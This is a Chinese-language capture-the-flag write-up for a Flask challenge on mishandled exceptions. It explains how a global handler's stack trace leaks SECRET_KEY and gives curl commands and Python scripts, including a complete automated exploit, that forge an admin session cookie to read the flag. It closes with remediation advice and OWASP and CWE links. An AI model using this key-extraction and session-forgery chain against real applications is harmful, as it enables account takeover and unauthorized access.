# A10-ExceptionHandling Easy - WriteUP

## 题目分析

本题是一个Flask Web应用，核心漏洞在于**异常处理不当导致的信息泄露**。开发者在调试过程中注册了全局异常处理器，当发生错误时返回包含完整Python堆栈跟踪的错误页面。这些堆栈中泄露了敏感的配置信息。

### 漏洞点

1. **全局异常处理器返回堆栈跟踪**：所有HTTP错误和未捕获异常都会返回 `traceback.format_exc()` 的完整输出
2. **SECRET_KEY泄露**：堆栈中会显示 `app.config['SECRET_KEY']` 的值
3. **flag文件路径泄露**：堆栈中会出现 `FLAG_PATH = '/flag'` 或数据库连接字符串
4. **Flask session使用不安全的序列化**：应用使用 `URLSafeTimedSerializer` 和 `SECRET_KEY` 签名session token，一旦SECRET_KEY泄露即可伪造

## 解题步骤

### 第一步：触发异常获取堆栈信息

访问不存在的文件，触发 `FileNotFoundError`：

```bash
curl "http://target/read?file=nonexistent"
```

或者访问会导致错误的其他端点。返回的HTML中会包含完整的Python堆栈跟踪。

在堆栈中搜索以下关键信息：
- `SECRET_KEY = ` —— Flask的session签名密钥
- `FLAG_PATH` 或 `DATABASE_URI` —— 敏感路径

### 第二步：从堆栈中提取SECRET_KEY

典型的堆栈中会包含类似：
```
File "/app/app.py", line 12, in <module>
    app.config['SECRET_KEY'] = 'flask_easy_2025_super_secret_key_0xdeadbeef'
```

提取到 `SECRET_KEY = 'flask_easy_2025_super_secret_key_0xdeadbeef'`

### 第三步：伪造admin session token

Flask应用使用 `URLSafeTimedSerializer` 生成session token。知道SECRET_KEY后，我们可以伪造一个角色为admin的token。

**Python伪造脚本：**

```python
#!/usr/bin/env python3
"""伪造Flask session token获取flag"""

from itsdangerous import URLSafeTimedSerializer

SECRET_KEY = 'flask_easy_2025_super_secret_key_0xdeadbeef'

s = URLSafeTimedSerializer(SECRET_KEY)
# 构造admin身份的数据
token = s.dumps({'user': 'admin', 'role': 'admin'})
print(f"伪造的Token: {token}")

# 用法：携带Cookie session=token 访问 /admin/flag
# 或使用Python requests库
import requests

url = "http://target/admin/flag"
session = requests.Session()
# 设置session cookie（Flask默认cookie名为session，但本题应用自定义存储在session['token']中）
# 需要先访问 /login 获取cookie结构，或者直接用session对象

# 由于应用把token存在session['token']，我们需要理解其session机制
# 如果Flask标准session：cookie名为session，值由itsdangerous签名
# 本题最简单方式：访问 /login?name=guest 获取cookie，然后用flask-unsign解码看看

# 更通用的方式：使用 flask-unsign 工具
# pip install flask-unsign
# flask-unsign --sign --cookie "{'token': 'xxx'}" --secret 'flask_easy_2025...'
```

**更实用的利用方式（针对本题应用逻辑）：**

本题中，token存储在Flask session的 `session['token']` 中。Flask的标准session是客户端session，存储在cookie中，由SECRET_KEY签名。

我们可以直接用 `flask-unsign` 工具伪造整个session cookie：

```bash
# 安装工具
pip install flask-unsign

# 先访问 /login?name=guest 获取一个cookie
curl -c cookies.txt "http://target/login?name=guest"

# 查看cookie（name为session）
cat cookies.txt

# 解码现有cookie
flask-unsign --decode --cookie '<session_cookie_value>'

# 伪造新的session cookie，包含admin token
flask-unsign --sign --cookie "{'token': 'eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.XXX'}" --secret 'flask_easy_2025_super_secret_key_0xdeadbeef'
```

或者直接用Python脚本：

```python
#!/usr/bin/env python3
import requests
from itsdangerous import URLSafeTimedSerializer
from flask.sessions import SecureCookieSessionInterface

SECRET_KEY = 'flask_easy_2025_super_secret_key_0xdeadbeef'

# 方法1：直接伪造URLSafeTimedSerializer token，然后通过标准Flask session传递
s = URLSafeTimedSerializer(SECRET_KEY)
admin_token = s.dumps({'user': 'admin', 'role': 'admin'})

# 构建Flask session cookie
class FakeApp:
    secret_key = SECRET_KEY

app = FakeApp()
session_interface = SecureCookieSessionInterface()
session = session_interface.open_session(app, None)
session['token'] = admin_token

# 编码cookie
serializer = session_interface.get_signing_serializer(app)
cookie = serializer.dumps(dict(session))
print(f"Session Cookie: {cookie}")

# 发送请求获取flag
r = requests.get("http://target/admin/flag", cookies={"session": cookie})
print(r.text)
```

### 第四步：获取flag

```bash
curl -b "session=<伪造的cookie>" "http://target/admin/flag"
```

返回页面中包含flag。

## 完整自动化脚本

```python
#!/usr/bin/env python3
import requests
import re
from itsdangerous import URLSafeTimedSerializer
from flask.sessions import SecureCookieSessionInterface

TARGET = "http://localhost:8080"

# Step 1: 触发异常，获取SECRET_KEY
print("[*] 触发异常获取堆栈信息...")
r = requests.get(f"{TARGET}/read?file=nonexistent")
html = r.text

# 从堆栈中提取SECRET_KEY
m = re.search(r"SECRET_KEY\s*=\s*'([^']+)'", html)
if not m:
    print("[-] 未找到SECRET_KEY")
    exit(1)
secret_key = m.group(1)
print(f"[+] SECRET_KEY: {secret_key}")

# Step 2: 伪造admin session token
s = URLSafeTimedSerializer(secret_key)
admin_token = s.dumps({'user': 'admin', 'role': 'admin'})
print(f"[+] Admin token: {admin_token}")

# Step 3: 构建Flask session cookie
class FakeApp:
    secret_key = secret_key

app = FakeApp()
session_interface = SecureCookieSessionInterface()
serializer = session_interface.get_signing_serializer(app)
session_cookie = serializer.dumps({'token': admin_token})
print(f"[+] Session cookie: {session_cookie}")

# Step 4: 获取flag
r = requests.get(f"{TARGET}/admin/flag", cookies={"session": session_cookie})
flag = re.search(r'flag\{[^}]+\}', r.text)
if flag:
    print(f"[+] FLAG: {flag.group(0)}")
else:
    print(r.text)
```

## 修复建议

1. **禁止在生产环境返回堆栈跟踪**
   ```python
   # 错误做法（本题）
   @app.errorhandler(Exception)
   def all_exceptions(e):
       import traceback
       return traceback.format_exc(), 500
   
   # 正确做法
   @app.errorhandler(Exception)
   def all_exceptions(e):
       app.logger.exception("Unhandled exception")
       return "Internal Server Error", 500
   ```

2. **使用环境变量存储SECRET_KEY，不硬编码在源码中**
   ```python
   app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY')
   ```

3. **使用专门的服务器端session存储（如redis），避免依赖客户端cookie签名**

4. **配置Flask生产模式**
   ```python
   app.config['DEBUG'] = False
   app.config['PROPAGATE_EXCEPTIONS'] = False
   ```

5. **使用标准日志记录异常，而非直接返回给用户**

## 相关OWASP链接

- [OWASP Top 10 2025 - A10: Mishandling of Exceptional Conditions](https://owasp.org/Top10/A10_2025-Mishandling_of_Exceptional_Conditions/)
- [CWE-209: Information Exposure Through an Error Message](https://cwe.mitre.org/data/definitions/209.html)
- [CWE-532: Insertion of Sensitive Information into Log File](https://cwe.mitre.org/data/definitions/532.html)
